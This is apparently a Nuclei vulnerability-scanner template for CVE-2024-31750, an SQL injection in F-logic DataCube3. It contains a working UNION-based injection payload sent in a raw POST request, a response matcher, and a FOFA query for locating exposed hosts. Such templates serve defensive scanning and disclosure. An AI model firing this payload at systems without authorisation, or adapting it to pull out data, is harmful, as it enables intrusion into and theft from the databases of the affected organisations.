id: CVE-2024-31750

info:
  name: F-logic DataCube3 - SQL Injection
  author: DhiyaneshDK
  severity: high
  description: |
    SQL injection vulnerability in f-logic datacube3 v.1.0 allows a remote attacker to obtain sensitive information via the req_id parameter.
  impact: |
    Attackers can execute arbitrary SQL queries, potentially extracting or modifying sensitive database information.
  remediation: |
    Update F-logic DataCube3 to a version that patches the SQL injection vulnerability.
  reference:
    - https://github.com/lampSEC/semcms/blob/main/datacube3.md
    - https://github.com/MrWQ/vulnerability-paper/blob/master/bugs/DataCube3%20getting_index_data.php%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
    - https://nvd.nist.gov/vuln/detail/CVE-2024-31750
    - https://github.com/wjlin0/poc-doc
    - https://github.com/wy876/POC
  classification:
    cve-id: CVE-2024-31750
    epss-score: 0.93636
    epss-percentile: 0.9983
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="DataCube3"
  tags: cve,cve2024,datacube3,sqli,vkev,vuln

http:
  - raw:
      - |
        POST /admin/pr_monitor/getting_index_data.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        req_id=1) UNION ALL SELECT CHAR(113,120,107,107,113)||CHAR(117,78,85,110,71,119,86,122,111,101,81,87,68,72,80,107,90,112,111,110,120,72,78,70,76,99,100,81,80,77,89,75,86,65,105,99,74,67,122,107)||CHAR(113,106,120,122,113),NULL,NULL-- sTqG

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "qxkkquNUnGwVzoeQWDHPkZponxHNFLcdQPMYKVAicJCzkqjxzq")'
          - 'contains(header, "application/json")'
          - 'status_code==200'
        condition: and
# digest: 4b0a00483046022100c5f23a5b495d1069039443c7f8d94f5d3ad722631522feaad7419b9b9744c23e022100bed0e49a29521b59eea671d2461e71fc60f2e126197555999967a5d45b2ef60a:922c64590222798bb761d5b6d8e72950